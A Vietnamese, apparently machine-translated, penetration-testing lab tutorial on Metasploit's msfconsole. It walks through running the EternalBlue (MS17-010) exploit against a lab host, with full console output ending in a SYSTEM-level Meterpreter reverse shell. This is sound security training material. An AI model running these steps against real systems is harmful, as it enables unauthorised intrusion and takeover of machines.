Đây là khung khai thác được sử dụng rộng rãi nhất.Đây là một công cụ mạnh mẽ có thể hỗ trợ tất cả các giai đoạn của một cuộc kiểm thử xâm nhập, từ thu thập thông tin đến sau khi khai thác.

Metasploit có hai phiên bản chính:

Metasploit Phiên bản Pro : Phiên bản thương mại giúp tự động hóa và quản lý các tác vụ. Phiên bản này có giao diện người dùng đồ họa (GUI).
Metasploit Framework : Phiên bản mã nguồn mở hoạt động từ dòng lệnh. Buổi học này sẽ tập trung vào phiên bản này, được cài đặt trên AttackBox và được sử dụng phổ biến nhất trong kiểm thử xâm nhập Linux phân phối. 

Metasploit Framework là một tập hợp các công cụ cho phép thu thập thông tin, quét, khai thác, phát triển mã khai thác, xử lý sau khai thác, và nhiều hơn nữa. Mặc dù mục đích sử dụng chính của...Metasploit
Khung phần mềm này tập trung vào lĩnh vực kiểm thử xâm nhập, đồng thời cũng hữu ích cho việc nghiên cứu lỗ hổng và phát triển khai thác.

Các thành phần chính của Metasploit. Khung lý thuyết có thể được tóm tắt như sau:

    msfconsole : Giao diện dòng lệnh chính.
    Các mô-đun : các mô-đun hỗ trợ như công cụ khai thác, công cụ quét, phần mềm độc hại, v.v.
    Công cụ : Các công cụ độc lập hỗ trợ nghiên cứu lỗ hổng bảo mật hoặc kiểm thử xâm nhập. Một số công cụ này là msfvenom, pattern_create và pattern_offset. Chúng ta sẽ tìm hiểu về msfvenom trong module này, nhưng pattern_create và pattern_offset là những công cụ hữu ích trong phát triển mã khai thác, điều này nằm ngoài phạm vi của module này. 

Trong khi sử dụng Trong Framework, bạn chủ yếu sẽ tương tác với Metasploit

Bạn có thể khởi chạy nó từ thiết bị đầu cuối AttackBox bằng cách sử dụng lệnh sau: `msfconsole`. Giao diện dòng lệnh sẽ là giao diện chính để bạn tương tác với các mô-đun khác nhau của Metasploit Framework. Mô-đun là các thành phần nhỏ trong Metasploit Framework được xây dựng để thực hiện một nhiệm vụ cụ thể, chẳng hạn như khai thác lỗ hổng, quét mục tiêu hoặc thực hiện tấn công vét cạn.

Trước khi đi sâu vào các module, sẽ rất hữu ích nếu làm rõ một vài khái niệm thường gặp: lỗ hổng, khai thác và tải trọng.

    Khai thác lỗ hổng: Một đoạn mã sử dụng điểm yếu hiện có trên hệ thống mục tiêu.
    Lỗ hổng bảo mật: Là lỗi thiết kế, lập trình hoặc logic ảnh hưởng đến hệ thống mục tiêu. Việc khai thác lỗ hổng này có thể dẫn đến việc tiết lộ thông tin mật hoặc cho phép kẻ tấn công thực thi mã trên hệ thống mục tiêu.
    Payload: Một cuộc tấn công sẽ khai thác lỗ hổng bảo mật. Tuy nhiên, nếu muốn cuộc tấn công đạt được kết quả mong muốn (truy cập vào hệ thống mục tiêu, đọc thông tin mật, v.v.), chúng ta cần sử dụng payload. Payload là đoạn mã sẽ được thực thi trên hệ thống mục tieu

Như đã đề cập trước đó, bảng điều khiển sẽ là giao diện chính của bạn để điều khiển. Khung sườn. Bạn có thể khởi chạy nó bằng cách sử dụng `msfconsole` lệnh trên thiết bị đầu cuối AttackBox của bạn hoặc bất kỳ hệ thống Metasploit nào Khung phần mềm đã được cài đặt. 
```
           
root@ip-10-10-220-191:~# msfconsole 
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search

msf6 >
```

Sau khi khởi chạy, bạn sẽ thấy dòng lệnh thay đổi thành msf6 (hoặc msf5 tùy thuộc vào phiên bản đã cài đặt).

Như bạn thấy, bảng điều khiển (msfconsole) có thể được sử dụng giống như một trình shell dòng lệnh thông thường. Dưới đây. Lệnh đầu tiên là lsDanh sách này liệt kê nội dung của thư mục mà từ đó Metasploit được cài đặt. được khởi chạy bằng cách sử dụng `msfconsole`yêu cầu.

Tiếp theo đó là một `ping` Đã gửi đến địa chỉ IP DNS của Google (8.8.8.8). Vì chúng tôi hoạt động từ AttackBox, vì đó là Linux nên chúng tôi phải thêm vào. `-c 1` tùy chọn đó, vì vậy chỉ một ping được gửi đi. Nếu không, ping sẽ được gửi đi. quá trình sẽ tiếp tục cho đến khi nó bị dừng lại bằng cách sử dụng `CTRL+C`.

```
msf6 > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms
msf6 >
```

Nó sẽ hỗ trợ hầu hết Linux lệnh, bao gồm `clear` (để xóa màn hình thiết bị đầu cuối), nhưng sẽ không Cho phép bạn sử dụng một số tính năng của dòng lệnh thông thường (ví dụ: không hỗ trợ chuyển hướng đầu ra), như được thấy bên dưới.

Nhân tiện nói về vấn đề này, lệnh trợ giúp có thể được sử dụng riêng lẻ hoặc cho một lệnh cụ thể. Dưới đây là menu trợ giúp cho lệnh đó. Lệnh set sẽ được đề cập sớm thôi.
```
msf6 > help set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 >
```

Bạn có thể sử dụng lệnh `history `để xem các lệnh bạn đã nhập trước đó. 
```
msf6 > history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
6  run
7  exit
8  exit -y
9  version
10  use exploit/multi/script/web_delivery
```

Một tính năng quan trọng của `msfconsole` là hỗ trợ tự động hoàn thành bằng phím Tab. Điều này sẽ rất hữu ích sau này khi sử dụng Các lệnh Metasploit hoặc thao tác với các mô-đun. Ví dụ, nếu bạn bắt đầu gõ `he` và nhấn vào tab Nhập từ khóa, bạn sẽ thấy nó tự động hoàn thành thành `help`.

Msfconsole được quản lý theo ngữ cảnh; điều này có nghĩa là trừ khi được thiết lập như một biến toàn cục, tất cả các thiết lập tham số sẽ được giữ nguyên. Dữ liệu sẽ bị mất nếu bạn thay đổi mô-đun đã chọn để sử dụng. Trong ví dụ bên dưới, chúng tôi đã sử dụng ms17_010_eternalblue khai thác, và chúng tôi đã thiết lập các tham số như sau: `RHOSTS` Nếu chúng ta chuyển sang một mô-đun khác (ví dụ: một cổng). (máy quét), chúng ta cần phải thiết lập lại giá trị RHOSTS vì tất cả các thay đổi chúng ta đã thực hiện vẫn nằm trong ngữ cảnh của... Lỗ hổng ms17_010_eternalblue.

Hãy xem ví dụ dưới đây để hiểu rõ hơn về tính năng này. Chúng ta sẽ sử dụng MS17-010. Lỗ hổng bảo mật “Eternalblue” được sử dụng để minh họa.

Sau khi bạn nhập `use exploit/windows/smb/ms17_010_eternalblue` lệnh, bạn sẽ thấy lệnh Thay đổi dòng nhắc từ `msf6` thành `msf6 exploit(windows/smb/ms17_010_eternalblue)`. "EternalBlue" là một lỗ hổng bảo mật. Được cho là do Cơ quan An ninh Quốc gia Hoa Kỳ (NSA) phát triển để khắc phục lỗ hổng ảnh hưởng đến máy chủ SMBv1. nhiều hệ thống Windows. (Server Message Block) được sử dụng rộng rãi trong mạng Windows để chia sẻ tập tin và Ngay cả khi gửi tập tin đến máy in. EternalBlue đã bị nhóm tội phạm mạng "Shadow Brokers" làm rò rỉ vào tháng Tư. 2017. Vào tháng 5 năm 2017, lỗ hổng này đã bị khai thác trên toàn thế giới trong cuộc tấn công ransomware WannaCry. 

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Bạn cũng có thể chọn mô-đun cần sử dụng bằng cách... uselệnh theo sau là số tại Đầu dòng kết quả tìm kiếm.

Mặc dù giao diện nhắc lệnh đã thay đổi, bạn sẽ nhận thấy chúng ta vẫn có thể chạy các lệnh đã đề cập trước đó. Điều này có nghĩa là chúng ta đã làm được điều đó. Không "vào" một thư mục như bạn thường thấy trong dòng lệnh của hệ điều hành.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Thông báo cho chúng ta biết rằng hiện tại chúng ta đã có một bối cảnh làm việc cụ thể. Bạn có thể xem điều này bằng cách gõ lệnh `show options` yêu cầu. 
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Thao tác này sẽ in ra các tùy chọn liên quan đến lỗ hổng bảo mật mà chúng ta đã chọn trước đó. Lệnh `show options` sẽ có các tùy chọn khác nhau. Kết quả đầu ra tùy thuộc vào ngữ cảnh sử dụng. Ví dụ trên cho thấy rằng khai thác này sẽ yêu cầu chúng ta thiết lập... các biến như RHOSTS và RPORT. Mặt khác, một mô-đun khai thác sau xâm nhập có thể chỉ cần chúng ta thiết lập ID phiên. (xem ảnh chụp màn hình bên dưới). Một phiên là một kết nối hiện có với hệ thống mục tiêu mà quá trình khai thác sau đó thực hiện. Mô-đun sẽ sử dụng. 

```
msf6 post(windows/gather/enum_domain_users) > show options

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on.
   USER                      no        Target User for NetSessionEnum

msf6 post(windows/gather/enum_domain_users) >
```
Cái `show` Lệnh có thể được sử dụng trong bất kỳ ngữ cảnh nào, theo sau là loại mô-đun (phụ trợ, tải trọng, khai thác, v.v.) v.v.) để liệt kê các mô-đun có sẵn. Ví dụ dưới đây liệt kê các payload có thể được sử dụng với ms17-010 Eternalblue khai thác. 

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
```
Nếu được sử dụng từ dấu nhắc msfconsole, thì `show` Lệnh này sẽ liệt kê tất cả các mô-đun.

Cái `use` Và `show options` Các lệnh mà chúng ta đã thấy cho đến nay đều giống hệt nhau đối với tất cả các mô-đun trong Metasploit.

Bạn có thể thoát khỏi ngữ cảnh bằng cách sử dụng `back` yêu cầu.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > 
```

Bạn có thể tìm thêm thông tin về bất kỳ mô-đun nào bằng cách nhập lệnh sau: `info` lệnh trong ngữ cảnh của nó.
Lệnh thông tin

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Sean Dillon 
  Dylan Davis 
  Equation Group
  Shadow Brokers
  thelightcosine

Available targets:
  Id  Name
  --  ----
  0   Windows 7 and Server 2008 R2 (x64) All Service Packs

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
  RPORT          445              yes       The target port (TCP)
  SMBDomain      .                no        (Optional) The Windows domain to use for authentication
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://cvedetails.com/cve/CVE-2017-0143/
  https://cvedetails.com/cve/CVE-2017-0144/
  https://cvedetails.com/cve/CVE-2017-0145/
  https://cvedetails.com/cve/CVE-2017-0146/
  https://cvedetails.com/cve/CVE-2017-0147/
  https://cvedetails.com/cve/CVE-2017-0148/
  https://github.com/RiskSense-Ops/MS17-010

Also known as:
  ETERNALBLUE

msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Ngoài ra, bạn cũng có thể sử dụng `info` lệnh theo sau là đường dẫn của mô-đun từ msfconsole lời nhắc (ví dụ: `info exploit/windows/smb/ms17_010_eternalblue`). Thông tin không phải là menu trợ giúp; nó sẽ hiển thị Thông tin chi tiết về mô-đun, chẳng hạn như tác giả, nguồn tham khảo liên quan, v.v.

Tìm kiếm

Một trong những thứ hữu ích nhất các lệnh trong msfconsole là `search` Lệnh này sẽ tìm kiếm Cơ sở dữ liệu Metasploit Framework chứa các mô-đun liên quan đến tham số tìm kiếm đã cho. Bạn có thể thực hiện tìm kiếm. Sử dụng số CVE, tên lỗ hổng (eternalblue, heartbleed, v.v.) hoặc hệ thống mục tiêu.

```     
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 >
```    

Kết quả đầu ra của `search` Lệnh này cung cấp tổng quan về từng mô-đun được trả về. Bạn có thể nhận thấy cột "tên". Nó cung cấp nhiều thông tin hơn là chỉ tên mô-đun. Bạn có thể thấy loại mô-đun (phụ trợ, khai thác, v.v.) và danh mục của mô-đun (máy quét, quản trị, Windows, Unix, v.v.). Bạn có thể sử dụng bất kỳ mô-đun nào được trả về trong kết quả tìm kiếm. Kết quả với lệnh sử dụng theo sau là số ở đầu dòng kết quả. (ví dụ: `use 0 `thay vì `use auxiliary/admin/smb/ms17_010_command`)

Bạn có thể định hướng tìm kiếm Hàm được tạo bằng cách sử dụng các từ khóa như loại và nền tảng.

Ví dụ, nếu chúng ta muốn Để kết quả tìm kiếm chỉ bao gồm các mô-đun phụ trợ, chúng ta có thể đặt loại là phụ trợ. Ảnh chụp màn hình bên dưới. Hiển thị kết quả của lệnh `search type:auxiliary telnet`.
```           
msf6 > search type:auxiliary telnet

Matching Modules
================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service
   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   5   auxiliary/scanner/telnet/brocade_enable_login                        normal  No     Brocade Enable Login Check Scanner
   6   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  No     Lantronix Telnet Password Recovery
   7   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  No     Lantronix Telnet Service Banner Detection
   8   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability
   9   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  No     Telnet Service Encryption Key ID Overflow Detection
   10  auxiliary/scanner/telnet/telnet_login                                normal  No     Telnet Login Check Scanner
   11  auxiliary/scanner/telnet/telnet_ruggedcom                            normal  No     RuggedCom Telnet Password Generator
   12  auxiliary/scanner/telnet/telnet_version                              normal  No     Telnet Service Banner Detection
   13  auxiliary/server/capture/telnet                                      normal  No     Authentication Capture: Telnet


Interact with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet
```

Tất cả các tham số đều được thiết lập bằng cùng một cú pháp lệnh:
`set PARAMETER_NAME VALUE`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
```

Các thông số bạn thường sẽ sử dụng Cách sử dụng là:

    RHOSTS: “Từ xa” "Máy chủ", địa chỉ IP của hệ thống mục tiêu. Có thể thiết lập một địa chỉ IP duy nhất hoặc một dải mạng. Điều này sẽ hỗ trợ ký hiệu CIDR (Định tuyến liên miền không phân lớp) (/24, /16, v.v.) hoặc dải mạng (10.10.10.x – 10.10.10.y). Bạn cũng có thể sử dụng một tệp liệt kê các mục tiêu, mỗi mục tiêu trên một dòng bằng cách sử dụng file:/path/of/the/target_file.txt, như bạn có thể thấy bên dưới.

    RPORT: “Từ xa” "port", là cổng trên hệ thống mục tiêu nơi ứng dụng dễ bị tổn thương đang chạy.
    PAYLOAD: Cái Payload mà bạn sẽ sử dụng với lỗ hổng bảo mật này.
    LHOST: “Localhost”, địa chỉ IP của máy tấn công (AttackBox hoặc Kali Linux của bạn).
    LPORT: “Địa phương "port", là cổng bạn sẽ sử dụng để kết nối ngược lại với shell. Đây là cổng trên máy chủ tấn công của bạn. máy, và bạn có thể thiết lập nó thành bất kỳ cổng nào không được ứng dụng nào khác sử dụng.
    SESSION: Mỗi Kết nối được thiết lập với hệ thống mục tiêu bằng Metasploit sẽ có một ID phiên. Bạn sẽ sử dụng ID này với Các mô-đun hậu khai thác sẽ kết nối với hệ thống mục tiêu bằng cách sử dụng kết nối hiện có.

 Bạn có thể ghi đè bất kỳ thiết lập nào. Bạn có thể sử dụng lệnh set để thiết lập lại tham số với một giá trị khác. Bạn cũng có thể xóa bất kỳ giá trị tham số nào bằng cách sử dụng lệnh này. `unset` lệnh hoặc xóa tất cả đã đặt các tham số với `unset all` yêu cầu.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
```

Bạn có thể sử dụng `setg` lệnh để thiết lập Các giá trị sẽ được sử dụng cho tất cả các mô-đun. `setg` lệnh được sử dụng như lệnh thiết lập. Sự khác biệt là nếu bạn sử dụng setlệnh để thiết lập Nếu bạn sử dụng một mô-đun để thiết lập giá trị, và khi bạn chuyển sang một mô-đun khác, bạn sẽ cần phải thiết lập lại giá trị đó. setg Lệnh này cho phép bạn đặt giá trị để nó có thể được sử dụng mặc định trên các mô-đun khác nhau. Bạn có thể xóa bất kỳ giá trị nào. giá trị được đặt với `setg` sử dụng `unsetg`. 

Sau khi tất cả các tham số mô-đun được Sau khi thiết lập, bạn có thể khởi chạy mô-đun bằng cách sử dụng `exploit` lệnh. Metasploit cũng hỗ trợ `run` lệnh, là một bí danh được tạo cho `exploit` lệnh như từ Việc khai thác lỗ hổng không có ý nghĩa gì khi sử dụng các mô-đun không phải là công cụ khai thác (máy quét cổng, máy quét lỗ hổng, v.v.).


Cái `exploit` lệnh có thể được sử dụng mà không cần bất kỳ tham số nào hoặc sử dụng dấu `-z` tham số.

Cái `exploit -z`Lệnh này sẽ chạy mã khai thác và đưa phiên làm việc vào chế độ nền ngay khi mở. 

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Điều này sẽ trả lại cho bạn Lời nhắc ngữ cảnh mà từ đó bạn đã chạy công cụ khai thác.

Một số mô-đun hỗ trợ `check` Tùy chọn này sẽ kiểm tra xem hệ thống mục tiêu có dễ bị tổn thương hay không mà không cần khai thác lỗ hổng đó. 

Phiên họp
Khi một lỗ hổng bảo mật đã bị khai thác thành công, Phiên làm việc sẽ được tạo. Đây là kênh liên lạc được thiết lập giữa hệ thống mục tiêu và Metasploit.

Bạn có thể sử dụng `background` Lệnh này dùng để đưa lời nhắc phiên làm việc về chế độ nền và quay lại lời nhắc msfconsole. 

 Ngoài ra, `CTRL+Z` có thể được sử dụng cho các phiên chạy ngầm.

Cái `sessions` Lệnh này có thể được sử dụng từ dấu nhắc msfconsole hoặc bất kỳ ngữ cảnh nào để xem thông tin hiện có. các buổi. 
Để tương tác với bất kỳ phiên nào, bạn có thể sử dụng `sessions -i` Lệnh được theo sau bởi số phiên mong muốn. 

```msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```
